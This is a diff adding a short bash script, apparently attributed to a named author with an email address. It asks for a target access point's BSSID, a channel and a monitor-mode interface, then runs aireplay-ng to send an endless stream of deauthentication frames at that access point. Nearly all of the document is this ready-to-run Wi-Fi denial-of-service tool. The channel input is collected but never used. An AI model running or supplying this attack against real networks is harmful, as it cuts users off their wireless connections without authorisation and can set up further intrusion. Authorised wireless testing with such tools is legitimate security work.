@@ -1,0 +1,15 @@
+#!/bin/bash
+echo "This script belongs to Godfidence!"
+echo "godfidence01@gmail.com"
+
+echo "Enter the BSSID and Channel of Your Target"
+
+echo "Enter Channel"
+read chan
+echo "Enter BSSID"
+read Bid
+echo "Enter Monitor-mode based interface"
+read mon
+
+
+aireplay-ng --deauth 0 -a $Bid $mon
